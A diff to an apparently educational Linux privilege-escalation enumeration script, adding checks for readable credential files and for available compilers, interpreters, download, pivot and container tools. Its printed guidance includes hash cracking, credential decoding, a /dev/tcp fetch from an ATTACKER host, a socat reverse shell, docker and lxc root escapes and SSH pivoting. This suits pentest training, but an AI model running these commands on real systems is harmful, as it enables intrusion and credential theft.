+        teach "    3. Identify target user (check .ssh/config or authorized_keys)"
+        teach "    4. ssh -i key user@target"
+        teach ""
+        teach "  API KEYS/TOKENS:"
+        teach "    1. Identify service (AWS, GitHub, etc.)"
+        teach "    2. Use appropriate CLI tool:"
+        teach "       aws configure set aws_access_key_id KEY"
+        teach "       export GITHUB_TOKEN=token"
+        teach "    3. Test access and enumerate permissions"
+        teach ""
+        teach "  PASSWORD FILES:"
+        teach "    1. Extract hashes: cat file | grep '$'"
+        teach "    2. Identify hash type: hash-identifier"
+        teach "    3. Crack: john --wordlist=rockyou.txt hashes.txt"
+        log ""
+    fi
+    
+    # Report readable sensitive configs
+    if [ -s "$temp_config_readable" ]; then
+        critical "SENSITIVE CONFIGS READABLE - Should be root-only"
+        log ""
+        
+        while IFS= read -r config; do
+            vuln "Readable config: $config"
+            
+            case "$config" in
+                */shadow)
+                    critical "  /etc/shadow is READABLE - password hashes exposed!"
+                    teach "  Extract hashes: grep -v '^[^:]*:[*!]:' /etc/shadow"
+                    teach "  Crack with john: john --wordlist=rockyou.txt shadow"
+                    ;;
+                */sudoers)
+                    critical "  /etc/sudoers is READABLE - sudo rules exposed"
+                    teach "  Review for NOPASSWD entries and misconfigurations"
+                    ;;
+                *sshd_config)
+                    warn "  SSH server config readable"
+                    teach "  Check for: PermitRootLogin yes, PasswordAuthentication yes"
+                    ;;
+                *my.cnf|*pg_hba.conf)
+                    warn "  Database config readable - may contain credentials"
+                    teach "  grep -E 'password|user' $config"
+                    ;;
+                *.aws/credentials)
+                    critical "  AWS credentials readable - cloud access!"
+                    teach "  Use with: aws configure --profile default"
+                    ;;
+                *.docker/config.json)
+                    warn "  Docker config readable - registry credentials"
+                    teach "  cat $config | jq -r '.auths[].auth' | base64 -d"
+                    ;;
+            esac
+            log ""
+        done < "$temp_config_readable"
+        
+        log ""
+    fi
+    
+    # PHASE 4: CLEAN SUMMARY
+    if [ $found_issues -eq 0 ]; then
+        ok "No high-value interesting files found in scanned locations"
+        log ""
+        teach "Scanned for:"
+        teach "  • Unusual SUID/SGID binaries"
+        teach "  • Recently modified sensitive files"
+        teach "  • Readable credential files (keys, secrets)"
+        teach "  • Readable sensitive configurations"
+    else
+        log ""
+        info "File discovery complete - $found_issues categories with findings"
+    fi
 }
 # ============================================
 # Enhanced Hidden File Search
@@ -6107,47 +6827,397 @@ enum_wordpress_extended() {
 }
 
 
-# ═══════════════════════════════════════════════════════════════
 # === TOOLS AVAILABILITY ===
 enum_tools() {
     section "INSTALLED TOOLS & COMPILERS"
     
-    teach "Available tools affect exploitation options. Compilers let you build exploits. Network tools enable pivoting."
+    # PHASE 1: SILENT SCAN - Categorize available tools by exploitation value
+    local temp_compilers="/tmp/.learnpeas_compilers_$$"
+    local temp_exploit_langs="/tmp/.learnpeas_exploit_langs_$$"
+    local temp_pivot_tools="/tmp/.learnpeas_pivot_tools_$$"
+    local temp_container_tools="/tmp/.learnpeas_container_tools_$$"
+    local temp_download_tools="/tmp/.learnpeas_download_tools_$$"
     
-    local tools=(
-        "gcc:Compile C exploits"
-        "g++:Compile C++ exploits"
-        "python:Run exploit scripts and pty shells"
-        "python3:Modern Python exploits"
-        "perl:Run Perl exploits"
-        "ruby:Run Ruby exploits"
-        "wget:Download exploits and tools"
-        "curl:Download files and interact with APIs"
-        "nc:Netcat for reverse shells"
-        "ncat:Modern netcat with SSL support"
-        "socat:Advanced socket relay tool"
-        "nmap:Port scanning and service detection"
-        "tcpdump:Packet capture for network analysis"
-        "git:Clone exploit repositories"
-        "docker:Container management (check group!)"
-        "kubectl:Kubernetes control (if in cluster)"
-    )
+    cleanup_tool_temps() {
+        rm -f "$temp_compilers" "$temp_exploit_langs" "$temp_pivot_tools" \
+              "$temp_container_tools" "$temp_download_tools" 2>/dev/null
+    }
+    trap cleanup_tool_temps RETURN
     
-    for tool_desc in "${tools[@]}"; do
-        local tool=$(echo "$tool_desc" | cut -d: -f1)
-        local desc=$(echo "$tool_desc" | cut -d: -f2)
-        
+    # Define tools by exploitation category (only critical ones)
+    # Compilers - needed to build kernel exploits, C exploits
+    local compilers=("gcc" "g++" "cc" "clang" "make")
+    
+    # Scripting languages - needed for exploit scripts and pty shells
+    local exploit_langs=("python" "python2" "python3" "perl" "ruby" "php" "node" "nodejs")
+    
+    # Download tools - needed to fetch exploits from exploit-db/GitHub
+    local download_tools=("wget" "curl" "fetch" "nc" "ncat" "socat")
+    
+    # Network/pivot tools - needed for lateral movement and pivoting
+    local pivot_tools=("nmap" "netcat" "nc" "ncat" "socat" "ssh" "sshpass" "proxychains" "chisel")
+    
+    # Container/orchestration - indicates container environment or orchestration access
+    local container_tools=("docker" "kubectl" "podman" "lxc" "lxd")
+    
+    # Scan for compilers
+    for tool in "${compilers[@]}"; do
         if command -v "$tool" >/dev/null 2>&1; then
-            info "✓ $tool - $desc"
+            local version=$(command -v "$tool" 2>/dev/null)
+            echo "$tool|$version" >> "$temp_compilers"
         fi
     done
     
-    # Check for language interpreters
-    if command -v python >/dev/null 2>&1 || command -v python3 >/dev/null 2>&1; then
-        teach "Python available - use for pty shells: python -c 'import pty; pty.spawn(\"/bin/bash\")'"
+    # Scan for exploit languages
+    for tool in "${exploit_langs[@]}"; do
+        if command -v "$tool" >/dev/null 2>&1; then
+            local version=$("$tool" --version 2>/dev/null | head -1 || echo "version unknown")
+            echo "$tool|$version" >> "$temp_exploit_langs"
+        fi
+    done
+    
+    # Scan for download tools
+    for tool in "${download_tools[@]}"; do
+        if command -v "$tool" >/dev/null 2>&1; then
+            echo "$tool" >> "$temp_download_tools"
+        fi
+    done
+    
+    # Scan for pivot tools
+    for tool in "${pivot_tools[@]}"; do
+        if command -v "$tool" >/dev/null 2>&1; then
+            echo "$tool" >> "$temp_pivot_tools"
+        fi
+    done
+    
+    # Scan for container tools (HIGH PRIORITY - check group membership)
+    for tool in "${container_tools[@]}"; do
+        if command -v "$tool" >/dev/null 2>&1; then
+            echo "$tool" >> "$temp_container_tools"
+        fi
+    done
+    
+    # PHASE 2: CONDITIONAL EDUCATION - Only if exploitation-critical tools found
+    local has_compilers=$([ -s "$temp_compilers" ] && echo 1 || echo 0)
+    local has_exploit_langs=$([ -s "$temp_exploit_langs" ] && echo 1 || echo 0)
+    local has_download=$([ -s "$temp_download_tools" ] && echo 1 || echo 0)
+    local has_pivot=$([ -s "$temp_pivot_tools" ] && echo 1 || echo 0)
+    local has_containers=$([ -s "$temp_container_tools" ] && echo 1 || echo 0)
+    
+    # Only show education if we found exploitation-enabling tools
+    if [ $has_compilers -eq 1 ]; then
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  COMPILERS - Building Kernel & Binary Exploits"
+        teach "╚═══════════════════════════════════════════════════════════"
+        teach ""
+        teach "WHY COMPILERS MATTER:"
+        teach "  Kernel exploits (DirtyCOW, Dirty Pipe, PwnKit) are distributed as C source."
+        teach "  Without gcc/clang, you cannot compile these exploits locally."
+        teach ""
+        teach "AVAILABLE COMPILERS:"
+        while IFS='|' read -r compiler path; do
+            info "  ✓ $compiler → $path"
+        done < "$temp_compilers"
+        teach ""
+        teach "EXPLOITATION WORKFLOW:"
+        teach "  1. Download exploit source:"
+        teach "     wget https://example.com/exploit.c"
+        teach "  2. Compile locally:"
+        teach "     gcc exploit.c -o exploit"
+        teach "     # Some exploits need specific flags (read the comments)"
+        teach "  3. Execute:"
+        teach "     ./exploit"
+        teach ""
+        teach "IF NO KERNEL HEADERS:"
+        teach "  Some kernel exploits need headers. If compilation fails:"
+        teach "  • Install headers: apt install linux-headers-\$(uname -r)"
+        teach "  • OR compile on matching system and transfer binary"
+        teach "  • OR use pre-compiled exploit (search exploit-db)"
+        teach ""
+        teach "COMMON COMPILE FLAGS:"
+        teach "  gcc -pthread exploit.c -o exploit          # Threading support"
+        teach "  gcc -static exploit.c -o exploit           # Static binary (portable)"
+        teach "  gcc -m32 exploit.c -o exploit              # 32-bit binary"
+        teach "  gcc -shared -fPIC evil.c -o evil.so        # Shared library (LD_PRELOAD)"
+        log ""
+    fi
+    
+    if [ $has_exploit_langs -eq 1 ]; then
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  SCRIPTING LANGUAGES - Exploit Scripts & Shell Upgrades"
+        teach "╚═══════════════════════════════════════════════════════════"
+        teach ""
+        teach "WHY SCRIPTING LANGUAGES MATTER:"
+        teach "  1. Many exploits are distributed as Python/Perl/Ruby scripts"
+        teach "  2. Needed for upgrading basic shells to full TTY"
+        teach "  3. Enable interactive shells with tab completion, job control"
+        teach ""
+        teach "AVAILABLE INTERPRETERS:"
+        while IFS='|' read -r lang version; do
+            info "  ✓ $lang → $version"
+        done < "$temp_exploit_langs"
+        teach ""
+        teach "SHELL UPGRADE TECHNIQUES:"
+        teach ""
+        
+        # Python-specific if available
+        if grep -q "python" "$temp_exploit_langs"; then
+            teach "  PYTHON PTY UPGRADE (Most Common):"
+            teach "    python -c 'import pty; pty.spawn(\"/bin/bash\")'"
+            teach "    # Or for Python 3:"
+            teach "    python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
+            teach ""
+            teach "    FULL INTERACTIVE TTY:"
+            teach "    1. python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
+            teach "    2. Ctrl+Z (background)"
+            teach "    3. stty raw -echo; fg"
+            teach "    4. export TERM=xterm-256color"
+            teach "    5. stty rows 38 columns 116  # Match your terminal"
+            teach ""
+        fi
+        
+        # Perl if available
+        if grep -q "perl" "$temp_exploit_langs"; then
+            teach "  PERL PTY UPGRADE:"
+            teach "    perl -e 'exec \"/bin/bash\";'"
+            teach "    # Or with pty module:"
+            teach "    perl -e 'use IO::Pty; \$pty = new IO::Pty; exec(\$pty->slave(), \"/bin/bash\");'"
+            teach ""
+        fi
+        
+        # Ruby if available
+        if grep -q "ruby" "$temp_exploit_langs"; then
+            teach "  RUBY PTY UPGRADE:"
+            teach "    ruby -e 'exec \"/bin/bash\"'"
+            teach "    # Or with pty:"
+            teach "    ruby -e 'require \"pty\"; PTY.spawn(\"/bin/bash\")'"
+            teach ""
+        fi
+        
+        teach "WHY UPGRADE SHELLS:"
+        teach "  Basic reverse shell (nc, bash -i) limitations:"
+        teach "  ✗ No tab completion"
+        teach "  ✗ No arrow keys (just ^[[D garbage)"
+        teach "  ✗ Ctrl+C kills entire shell"
+        teach "  ✗ No text editors (vim/nano fail)"
+        teach "  ✗ sudo prompts often fail"
+        teach ""
+        teach "  Full TTY shell benefits:"
+        teach "  ✓ Tab completion works"
+        teach "  ✓ Arrow keys for history"
+        teach "  ✓ Ctrl+C only kills current command"
+        teach "  ✓ Text editors work perfectly"
+        teach "  ✓ sudo password prompts work"
+        teach "  ✓ Programs detect interactive terminal"
+        log ""
+    fi
+    
+    if [ $has_download -eq 0 ]; then
+        critical "NO DOWNLOAD TOOLS AVAILABLE - Cannot fetch exploits"
+        warn "Missing: wget, curl, nc, fetch"
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  NO DOWNLOAD CAPABILITY - Critical Limitation"
+        teach "╚═══════════════════════════════════════════════════════════"
+        teach ""
+        teach "IMPACT:"
+        teach "  Cannot download exploits from exploit-db or GitHub"
+        teach "  Must rely on pre-existing binaries or creative alternatives"
+        teach ""
+        teach "WORKAROUNDS:"
+        teach ""
+        teach "  1. ECHO/PRINTF (for small scripts):"
+        teach "     cat > exploit.sh << 'EOF'"
+        teach "     #!/bin/bash"
+        teach "     # paste exploit code here line by line"
+        teach "     EOF"
+        teach "     chmod +x exploit.sh"
+        teach ""
+        teach "  2. BASE64 TRANSFER (for binaries):"
+        teach "     # On attacker machine:"
+        teach "     base64 exploit > exploit.b64"
+        teach "     # Copy contents, then on target:"
+        teach "     cat > exploit.b64 << 'EOF'"
+        teach "     # paste base64 content"
+        teach "     EOF"
+        teach "     base64 -d exploit.b64 > exploit"
+        teach "     chmod +x exploit"
+        teach ""
+        teach "  3. FTP/SCP (if available):"
+        teach "     # Check for ftp, sftp, scp clients"
+        teach "     command -v ftp && echo 'FTP available'"
+        teach "     command -v scp && echo 'SCP available'"
+        teach ""
+        teach "  4. EXISTING WEB SERVER:"
+        teach "     # If target can make outbound HTTP (check firewall):"
+        teach "     # Start server on attacker: python3 -m http.server 8080"
+        teach "     # On target, try alternate methods:"
+        teach "     exec 3<>/dev/tcp/ATTACKER/8080"
+        teach "     echo -e 'GET /exploit HTTP/1.0\\r\\n\\r\\n' >&3"
+        teach "     cat <&3"
+        teach ""
+        teach "  5. SHARED MOUNT (NFS/SMB):"
+        teach "     # Check if any network shares mounted"
+        teach "     mount | grep -E 'nfs|cifs|smb'"
+        teach "     # Upload exploits to shared location"
+        log ""
+    else
+        info "Download tools available:"
+        cat "$temp_download_tools" | while read tool; do
+            info "  ✓ $tool"
+        done
+    fi
+    
+    if [ $has_pivot -eq 1 ]; then
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  PIVOTING & LATERAL MOVEMENT TOOLS"
+        teach "╚═══════════════════════════════════════════════════════════"
+        teach ""
+        teach "AVAILABLE TOOLS:"
+        cat "$temp_pivot_tools" | while read tool; do
+            info "  ✓ $tool"
+        done
+        teach ""
+        teach "PIVOTING SCENARIOS:"
+        teach ""
+        
+        if grep -q "ssh" "$temp_pivot_tools"; then
+            teach "  SSH TUNNELING (Port Forwarding):"
+            teach "    LOCAL FORWARD - Access internal service from attacker:"
+            teach "      ssh -L 8080:internal-host:80 user@compromised-host"
+            teach "      # Now: localhost:8080 → internal-host:80"
+            teach ""
+            teach "    DYNAMIC FORWARD - SOCKS proxy for all traffic:"
+            teach "      ssh -D 1080 user@compromised-host"
+            teach "      # Configure browser/tools to use SOCKS5 localhost:1080"
+            teach "      proxychains nmap 192.168.1.0/24"
+            teach ""
+            teach "    REMOTE FORWARD - Expose attacker service to internal network:"
+            teach "      ssh -R 8080:localhost:80 user@compromised-host"
+            teach "      # Internal network can now access your web server"
+            teach ""
+        fi
+        
+        if grep -q "nmap" "$temp_pivot_tools"; then
+            teach "  NMAP - Internal Network Reconnaissance:"
+            teach "    # Fast ping sweep"
+            teach "    nmap -sn 192.168.1.0/24"
+            teach ""
+            teach "    # Port scan discovered host"
+            teach "    nmap -p- -T4 192.168.1.50"
+            teach ""
+            teach "    # Service version detection"
+            teach "    nmap -sV -sC 192.168.1.50"
+            teach ""
+        fi
+        
+        if grep -q "socat" "$temp_pivot_tools"; then
+            teach "  SOCAT - Advanced Port Forwarding:"
+            teach "    # Port relay (forward local port to remote)"
+            teach "    socat TCP-LISTEN:8080,fork TCP:internal-host:80"
+            teach ""
+            teach "    # Encrypted reverse shell"
+            teach "    # On attacker:"
+            teach "    openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem"
+            teach "    socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0,fork STDOUT"
+            teach "    # On target:"
+            teach "    socat OPENSSL:attacker:443,verify=0 EXEC:/bin/bash"
+            teach ""
+        fi
+        log ""
+    fi
+    
+    if [ $has_containers -eq 1 ]; then
+        log ""
+        teach "╔═══════════════════════════════════════════════════════════╗"
+        teach "║  CONTAINER TOOLS - Privilege and Group Membership Check"
+        teach "╚═══════════════════════════════════════════════════════════"
+        teach ""
+        teach "AVAILABLE TOOLS:"
+        cat "$temp_container_tools" | while read tool; do
+            case "$tool" in
+                docker)
+                    if groups | grep -qw "docker"; then
+                        critical "DOCKER: (and you are in docker group: INSTANT root possible)"
+                        critical "  INSTANT ROOT: docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash"
+                    else
+                        warn "  ! docker (but you are NOT in docker group)"
+                        teach "    You need to be in the docker group for root-level access. Check: grep docker /etc/group"
+                        teach "    If you can escalate to a user in the docker group, you will have instant root." 
+                        teach "    To see which users have instant root via Docker, run: getent group docker"
+                        teach "    Any username listed can use Docker for root access. Try to escalate to one of these users."
+                    fi
+                    ;;
+                lxd|lxc)
+                    if groups | grep -qw "$tool"; then
+                        critical "  ! $tool (and you are in $tool group: INSTANT root possible)"
+                        critical "        POTENTIAL INSTANT ROOT: Detailled overview available"
+                        warn "     Please note LXC might be blocked from connecting to the internet and might require"
+                        warn "     the attacker to import their own container image (more info coming soon). "
+                        teach "    First optain the container image: "
+                        teach "    lxc init ubuntu:18.04 privesc -c security.privileged=true"
+                        teach "    Next mount the host filesystem to it: "
+                        teach "    lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true"
+                        teach "    Start the container: "
+                        teach "    lxc start privesc"
+                        teach "    Start a shell: "
+                        teach "    lxc exec privesc /bin/bash"
+                        teach "    cd /mnt/root/root"
+                    else
+                        warn "  ! $tool (but you are NOT in $tool group)"
+                        teach "    You need to be in the $tool group for root-level access. Check: grep $tool /etc/group"
+                    fi
+                    ;;
+                podman)
+                    info "  ! podman (rootless containers possible, but group membership not required)"
+                    ;;
+                kubectl)
+                    warn "  ! kubectl (Kubernetes control available, check cluster access)"
+                    teach "    Check cluster access: kubectl get pods"
+                    teach "    List namespaces: kubectl get namespaces"
+                    teach "    If you have access, check for privileged pods or secrets"
+                    ;;
+                *)
+                    info "  ! $tool"
+                    ;;
+            esac
+        done
+        teach ""
+        teach "CRITICAL CHECK - Group Membership:"
+        teach "  Current groups: $(groups)"
+        teach ""
+        teach "WHY THESE TOOLS MATTER:"
+        teach "  Container orchestration tools run with root-equivalent privileges if you are in the right group."
+        teach "  Group membership in docker/lxd is functionally equivalent to root."
+        teach "  See the PRIVILEGED GROUP MEMBERSHIP section for full exploitation."
+        log ""
+    fi
+    
+    # PHASE 3: SUMMARY - Only show if no critical tools found
+    local any_critical=$((has_compilers + has_exploit_langs + has_download + has_containers))
+    
+    if [ $any_critical -eq 0 ]; then
+        warn "Limited toolset available - exploitation options restricted"
+        log ""
+        teach "IMPACT OF MISSING TOOLS:"
+        teach "  • Cannot compile kernel exploits locally (no gcc)"
+        teach "  • Cannot download exploits (no wget/curl)"
+        teach "  • Limited shell upgrade options (no Python/Perl)"
+        teach "  • Must rely on pre-existing binaries or creative workarounds"
+        teach ""
+        teach "ALTERNATIVE STRATEGIES:"
+        teach "  1. Search for pre-compiled exploits on target"
+        teach "  2. Look for SUID binaries (don't need compilation)"
+        teach "  3. Check writable cron jobs or services"
+        teach "  4. Exploit misconfigurations (sudo, capabilities, etc.)"
+        teach "  5. Use built-in binaries for creative exploitation"
+    else
+        ok "Exploitation toolset available - kernel exploits and scripts can be used"
     fi
 }
-
 # === WILDCARD INJECTION ===
 enum_wildcards() {
     section "WILDCARD INJECTION OPPORTUNITIES"
@@ -6589,7 +7659,7 @@ EOF
     echo -e "\033[32mMMMMMMMMMMMM\033[0m                                     \033[34mMMMMMMMMMMMM\033[0m                            "
     cat << "EOF"
     
-              Educational Privilege Escalation Tool - Version 1.7.0
+              Educational Privilege Escalation Tool - Version 1.5.0
     
     ════════════════════════════════════════════════════════════════
 
